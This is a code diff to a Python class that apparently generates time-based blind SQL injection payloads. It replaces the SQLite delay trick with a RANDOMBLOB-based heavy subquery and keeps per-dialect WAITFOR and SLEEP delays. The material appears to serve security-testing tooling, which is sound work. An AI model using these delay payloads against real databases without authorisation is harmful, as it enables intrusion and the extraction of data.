@@ -30,10 +30,15 @@ class AstPayloadGenerator:
             delay_str = f"0:0:{sleep_time}"
             sleep_func = exp.WaitFor(delay=exp.Literal.string(delay_str))
         elif self.dialect == "sqlite":
-            # SQLite has no built-in sleep, so we create a delay with a heavy query (cartesian product).
-            # This is a bit of a hack, but effective. A simple payload is enough for the optimizer.
-            heavy_query = "(SELECT COUNT(*) FROM (SELECT 1 UNION ALL SELECT 2) a, (SELECT 1 UNION ALL SELECT 2) b, (SELECT 1 UNION ALL SELECT 2) c, (SELECT 1 UNION ALL SELECT 2) d, (SELECT 1 UNION ALL SELECT 2) e, (SELECT 1 UNION ALL SELECT 2) f)"
-            sleep_func = sqlglot.parse_one(heavy_query)
+            # The COUNT(*) method was ineffective. A better method is to force a computationally
+            # expensive operation. We use a nested query with RANDOMBLOB to make it harder
+            # for a query planner to optimize away and more specific to SQLite's behavior.
+            # Blob size is proportional to sleep time. 500k bytes/sec.
+            blob_size = max(500000, int(sleep_time * 500000))
+            # This nested subquery is less likely to be optimized out.
+            heavy_query = f"(SELECT 1 WHERE LENGTH(HEX(RANDOMBLOB({blob_size}))) > 0)"
+            # Check if the subquery returns a result.
+            sleep_func = sqlglot.parse_one(f"{heavy_query} IS NOT NULL")
         else: # Default to MySQL's SLEEP
             sleep_func = exp.Sleep(this=exp.Literal.number(sleep_time))
 
